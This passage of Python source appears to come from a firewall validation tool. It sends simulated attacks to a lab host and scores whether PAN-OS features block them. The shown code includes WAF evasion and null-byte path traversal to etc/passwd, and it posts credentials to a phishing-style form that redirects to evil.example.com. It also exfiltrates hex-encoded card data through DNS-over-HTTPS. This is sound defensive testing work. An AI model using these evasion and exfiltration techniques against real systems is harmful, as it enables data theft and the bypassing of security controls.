                    f'Chunked request got response — may not have been inspected: {resp_str[:150]}',
                    url=url, method='POST', sent_payload=payload)
            except (ConnectionResetError, BrokenPipeError) as e:
                return self._blocked_result(test,
                    f'Connection reset — firewall detected chunked evasion: {e}',
                    url=url, method='POST', sent_payload=payload)
            except (socket.timeout, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'evasion_null_byte':
            # Path traversal with null byte — send as raw URL path
            url = f'http://{host}:{http_port}/{payload}'
            try:
                resp = requests.get(url, timeout=10)
                return self._analyze_response(test, resp, 'etc/passwd',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        else:
            # evasion_double_encode, evasion_unicode, evasion_case_mixing, evasion_comment_insert
            # Send payload as-is in query parameter (don't let requests re-encode)
            url = f'http://{host}:{http_port}/echo?payload={payload}'
            try:
                resp = requests.get(url, timeout=10)
                # Check for SQL/XSS indicators in response
                markers = ['UNION', 'SELECT', 'script', 'alert', 'passwd']
                marker_found = any(m.lower() in (resp.text or '').lower() for m in markers)
                if marker_found:
                    return self._passthrough_result(test, resp.status_code,
                        'Evasion payload echoed back — firewall did not decode/normalize',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, '',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

    def _test_credential_phishing(self, test: SecurityTestCase, host: str,
                                    http_port: int) -> SecurityTestResult:
        """Test credential phishing prevention — submit credentials to login forms."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'phish_http_login':
            url = f'http://{host}:{http_port}/login'
            try:
                resp = requests.post(url, data={
                    'username': 'admin@acmecorp.com',
                    'password': 'P@ssw0rd123!',
                }, timeout=10)
                if resp.status_code == 200 and 'authenticated' in (resp.text or '').lower():
                    return self._passthrough_result(test, resp.status_code,
                        'Credentials accepted — Credential Phishing Prevention did not block submission. '
                        'Verify User-ID is configured and Credential Phishing Prevention is enabled in URL Filtering profile',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, 'authenticated',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Credential Phishing Prevention detected credential submission: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'phish_https_login':
            url = f'https://{host}:443/login'
            try:
                resp = requests.post(url, data={
                    'username': 'admin@acmecorp.com',
                    'password': 'P@ssw0rd123!',
                }, timeout=10, verify=False)
                if resp.status_code == 200 and 'authenticated' in (resp.text or '').lower():
                    return self._passthrough_result(test, resp.status_code,
                        'Credentials accepted over HTTPS — SSL Decryption + Credential Phishing Prevention did not block. '
                        'Verify SSL Decryption policy and Credential Phishing Prevention are both active',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, 'authenticated',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — credential submission over HTTPS detected: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'phish_js_exfil':
            url = f'http://{host}:{http_port}/echo?u=admin@acmecorp.com&p=P@ssw0rd123!&action=keylog&src=formgrabber'
            try:
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Credentials exfiltrated via URL parameters — firewall did not detect credential data in GET request. '
                        'Check URL Filtering and Credential Phishing Prevention settings',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, '',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — credential exfiltration via URL detected: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'phish_hidden_form':
            url = f'http://{host}:{http_port}/login'
            try:
                resp = requests.post(url, data={
                    'username': 'admin@acmecorp.com',
                    'password': 'P@ssw0rd123!',
                    'csrf_token': 'abc123def456',
                    'redirect_url': 'http://evil.example.com/collect',
                    'org': 'AcmeCorp',
                }, timeout=10)
                if resp.status_code == 200 and 'authenticated' in (resp.text or '').lower():
                    return self._passthrough_result(test, resp.status_code,
                        'Phishing form accepted credentials with redirect to external domain — '
                        'Credential Phishing Prevention should detect this pattern',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, 'authenticated',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — phishing form credential harvest detected: {e}',
                    url=url, method='POST', sent_payload=payload)

        return self._error_result(test, f'Unknown credential phishing test: {test.id}')

    def _test_encrypted_dns(self, test: SecurityTestCase, host: str,
                             http_port: int) -> SecurityTestResult:
        """Test encrypted DNS (DoH/DoT) — firewall should detect and control encrypted DNS channels."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'doh_google':
            url = f'https://dns.google/resolve?name={payload}&type=A'
            try:
                result = subprocess.run(
                    ['curl', '-s', '-m', '5', '-H', 'accept: application/dns-json', url],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0 and result.stdout and '"Answer"' in result.stdout:
                    return self._passthrough_result(test, 200,
                        'DoH query to Google DNS succeeded — firewall did not block DNS-over-HTTPS. '
                        'Enable App-ID policy to block dns-over-https application',
                        url=url, method='GET', sent_payload=payload)
                if result.returncode != 0 or not result.stdout:
                    return self._blocked_result(test,
                        f'DoH query blocked — App-ID identified and blocked dns-over-https (exit code: {result.returncode})',
                        url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'DoH query did not return DNS answer — possibly blocked: {result.stdout[:150]}',
                    url=url, method='GET', sent_payload=payload)
            except (subprocess.TimeoutExpired, OSError) as e:
                return self._blocked_result(test,
                    f'DoH connection timed out or blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'doh_cloudflare':
            url = f'https://cloudflare-dns.com/dns-query?name={payload}&type=A'
            try:
                result = subprocess.run(
                    ['curl', '-s', '-m', '5', '-H', 'accept: application/dns-json', url],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0 and result.stdout and '"Answer"' in result.stdout:
                    return self._passthrough_result(test, 200,
                        'DoH query to Cloudflare DNS succeeded — firewall did not block DNS-over-HTTPS. '
                        'Enable App-ID policy to block dns-over-https application',
                        url=url, method='GET', sent_payload=payload)
                if result.returncode != 0 or not result.stdout:
                    return self._blocked_result(test,
                        f'DoH query blocked — App-ID identified and blocked dns-over-https (exit code: {result.returncode})',
                        url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'DoH query did not return answer — possibly blocked: {result.stdout[:150]}',
                    url=url, method='GET', sent_payload=payload)
            except (subprocess.TimeoutExpired, OSError) as e:
                return self._blocked_result(test,
                    f'DoH connection timed out or blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'doh_exfil':
            # Encode credit card data as hex subdomain in DoH query
            exfil_data = '4111111111111111'
            hex_encoded = exfil_data.encode().hex()
            domain = f'{hex_encoded}.exfil.testdomain.com'
            url = f'https://dns.google/resolve?name={domain}&type=A'
            try:
                result = subprocess.run(
                    ['curl', '-s', '-m', '5', '-H', 'accept: application/dns-json', url],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0 and result.stdout and len(result.stdout) > 10:
                    return self._passthrough_result(test, 200,
                        'Data exfiltration via DoH succeeded — hex-encoded sensitive data sent in DNS subdomain over HTTPS. '
                        'Firewall did not block encrypted DNS exfiltration channel',
                        url=url, method='GET', sent_payload=f'{hex_encoded}.exfil.testdomain.com')
                return self._blocked_result(test,
                    f'DoH exfiltration blocked — firewall detected encrypted DNS data channel (exit code: {result.returncode})',
                    url=url, method='GET', sent_payload=f'{hex_encoded}.exfil.testdomain.com')
            except (subprocess.TimeoutExpired, OSError) as e:
                return self._blocked_result(test,
                    f'DoH exfiltration blocked: {e}',
                    url=url, method='GET', sent_payload=f'{hex_encoded}.exfil.testdomain.com')

        elif test.id == 'dot_query':
            # DNS-over-TLS on port 853
            url = 'tls://dns.google:853'
            try:
                # Build a minimal DNS query for the domain
                domain = payload or 'hacking.testcategory.com'
                txn_id = os.urandom(2)
                flags = struct.pack('!H', 0x0100)  # standard query, recursion desired
                counts = struct.pack('!HHHH', 1, 0, 0, 0)  # 1 question
                qname = b''
                for label in domain.split('.'):
                    qname += bytes([len(label)]) + label.encode()
                qname += b'\x00'
                qtype_qclass = struct.pack('!HH', 1, 1)  # A record, IN class
                dns_query = txn_id + flags + counts + qname + qtype_qclass
                # Wrap in TCP length prefix for DNS-over-TLS
                dns_msg = struct.pack('!H', len(dns_query)) + dns_query

                # Connect via TLS to port 853
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                tls_sock = ctx.wrap_socket(sock, server_hostname='dns.google')
                tls_sock.connect(('dns.google', 853))
                tls_sock.sendall(dns_msg)
                resp_data = tls_sock.recv(4096)
                tls_sock.close()

                if resp_data and len(resp_data) > 4:
                    return self._passthrough_result(test, 200,
                        'DNS-over-TLS query succeeded — firewall did not block DoT on port 853. '
                        'Enable App-ID policy to block dns-over-tls application',
                        url=url, method='TLS', sent_payload=domain)
                return self._blocked_result(test,
                    'DoT query returned empty response — possibly blocked',
                    url=url, method='TLS', sent_payload=domain)
            except (ConnectionResetError, BrokenPipeError) as e:
                return self._blocked_result(test,
                    f'Connection reset — App-ID blocked DNS-over-TLS: {e}',
                    url=url, method='TLS', sent_payload=payload)
            except (socket.timeout, ssl.SSLError, OSError) as e:
                return self._blocked_result(test,
                    f'DoT connection blocked or timed out: {e}',
                    url=url, method='TLS', sent_payload=payload)

        return self._error_result(test, f'Unknown encrypted DNS test: {test.id}')

    # ─── Built-in Test Overrides ─────────────────────────────

    def get_builtin_test(self, test_id: str) -> Optional[dict]:
        """Return the original unmodified built-in test for reset purposes."""
        original = TEST_MAP.get(test_id)
        if not original:
            return None
        return {
            'id': original.id, 'name': original.name, 'category': original.category,
            'description': original.description, 'expected_action': original.expected_action,
            'panos_feature': original.panos_feature, 'payload': ATTACK_PAYLOADS.get(original.id, ''),
            'method': original.method, 'headers': original.headers,
            'target_path': original.target_path,
        }

    def save_override(self, test_id: str, updates: dict) -> Optional[dict]:
        """Save an override for a built-in test. Uses custom store with override_of field."""
        if test_id not in TEST_MAP:
            return None
        if not self._custom_store:
            return None
        original = TEST_MAP[test_id]
        # Check if override already exists
        existing = None
        for p in self._custom_store.list():
            if p.get('override_of') == test_id:
                existing = p
                break
        override_data = {
            'name': updates.get('name', original.name),
            'category': updates.get('category', original.category),
            'description': updates.get('description', original.description),
            'payload': updates.get('payload', ATTACK_PAYLOADS.get(test_id, '')),
            'method': updates.get('method', original.method),
            'headers': updates.get('headers', original.headers),
            'target_path': updates.get('target_path', original.target_path),
            'expected_action': updates.get('expected_action', original.expected_action),
            'panos_feature': updates.get('panos_feature', original.panos_feature),
            'override_of': test_id,
        }
        if existing:
            result = self._custom_store.update(existing['id'], override_data)
        else:
            result = self._custom_store.add(override_data)
        self._reload_custom()
        return result

    def delete_override(self, test_id: str) -> bool:
        """Remove override for a built-in test (reset to default)."""
        if not self._custom_store:
            return False
        for p in self._custom_store.list():
            if p.get('override_of') == test_id:
                self._custom_store.delete(p['id'])
                self._reload_custom()
                return True
        return False

    # ─── Response Analysis ──────────────────────────────────

    def _analyze_response(self, test: SecurityTestCase, resp,
                          payload_marker: str, url='', method='',
                          sent_payload='') -> SecurityTestResult:
        """Determine if a response indicates the attack was blocked or passed through."""
        if self._is_block_page(resp):
            return self._blocked_result(test,
                f'HTTP {resp.status_code} — Block page detected', resp.status_code,
                resp=resp, url=url, method=method, sent_payload=sent_payload)

        if resp.status_code in (403, 406, 503):
            return self._blocked_result(test,
                f'HTTP {resp.status_code} — blocked by firewall', resp.status_code,
                resp=resp, url=url, method=method, sent_payload=sent_payload)

        if resp.status_code == 200:
            body = resp.text
            if payload_marker and payload_marker in body:
                return self._passthrough_result(test, resp.status_code,
                    'Payload echoed back — attack passed through firewall',
                    resp=resp, url=url, method=method, sent_payload=sent_payload)
            if '/echo' in (resp.url or '') or 'Echo Response' in body:
                return self._passthrough_result(test, resp.status_code,
                    'Echo server responded — attack passed through',
                    resp=resp, url=url, method=method, sent_payload=sent_payload)

        return self._passthrough_result(test, resp.status_code,
            f'HTTP {resp.status_code} — not blocked',
            resp=resp, url=url, method=method, sent_payload=sent_payload)

    def _is_block_page(self, resp) -> bool:
        """Check if response contains a PAN-OS block page."""
        text = resp.text.lower() if resp.text else ''
        for marker in BLOCK_PAGE_MARKERS:
            if marker.lower() in text:
                return True
        return False

    def _blocked_result(self, test, detail, status_code=0,
                        resp=None, url='', method='', sent_payload=''):
        expected = EXPECTED_BEHAVIOR.get(test.id, f'Firewall should block this {test.panos_feature} threat')
        proto = method if method in ('DNS', 'SSH', 'FTP') else 'HTTP'
        if proto == 'HTTP':
            how = 'The connection was reset, timed out, or a block page was returned'
        else:
            how = f'The {proto} connection was refused, reset, or timed out'
        explanation = (f'PASS — The firewall correctly blocked this attack. '
                      f'{how}, indicating that {test.panos_feature} detected the threat pattern.')
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='blocked',
            verdict='PASS', response_code=status_code, detail=detail,
            panos_feature=test.panos_feature, threat_id=test.threat_id,
            timestamp=time.time(), description=test.description,
            payload=sent_payload, url=url, method=method,
            expected_behavior=expected,
            response_body_snippet=_resp_snippet(resp) if resp else '',
            response_headers=_resp_headers(resp) if resp else {},
            verdict_explanation=explanation)

    def _passthrough_result(self, test, status_code, detail,
                            resp=None, url='', method='', sent_payload=''):
        expected = EXPECTED_BEHAVIOR.get(test.id, f'Firewall should block this {test.panos_feature} threat')
        proto = method if method in ('DNS', 'SSH', 'FTP') else 'HTTP'
        if proto == 'DNS':
            resp_desc = 'The DNS query was resolved without interception'
        elif proto in ('SSH', 'FTP'):
            resp_desc = f'The {proto} connection succeeded without interception'
        else:
            resp_desc = f'The server responded with HTTP {status_code} and the payload was delivered'
        explanation = (f'FAIL — The attack was NOT blocked by the firewall. '
                      f'{resp_desc}. '
                      f'Verify: (1) {test.panos_feature} profile is attached to the security policy rule, '
                      f'(2) the traffic between client and server matches the policy rule (correct zones/IPs), '
                      f'(3) the action is set to "reset-both" or "drop" (not "alert").')
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='passed_through',
            verdict='FAIL', response_code=status_code, detail=detail,
            panos_feature=test.panos_feature, threat_id=test.threat_id,
            timestamp=time.time(), description=test.description,
            payload=sent_payload, url=url, method=method,
            expected_behavior=expected,
            response_body_snippet=_resp_snippet(resp) if resp else '',
            response_headers=_resp_headers(resp) if resp else {},
            verdict_explanation=explanation)

    def _error_result(self, test, detail, url='', method='', sent_payload=''):
        expected = EXPECTED_BEHAVIOR.get(test.id, '')
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='error',
            verdict='ERROR', response_code=0, detail=detail,
            panos_feature=test.panos_feature, threat_id=test.threat_id,
            timestamp=time.time(), description=test.description,
            payload=sent_payload, url=url, method=method,
            expected_behavior=expected,
            verdict_explanation=f'ERROR — Test could not complete: {detail}')
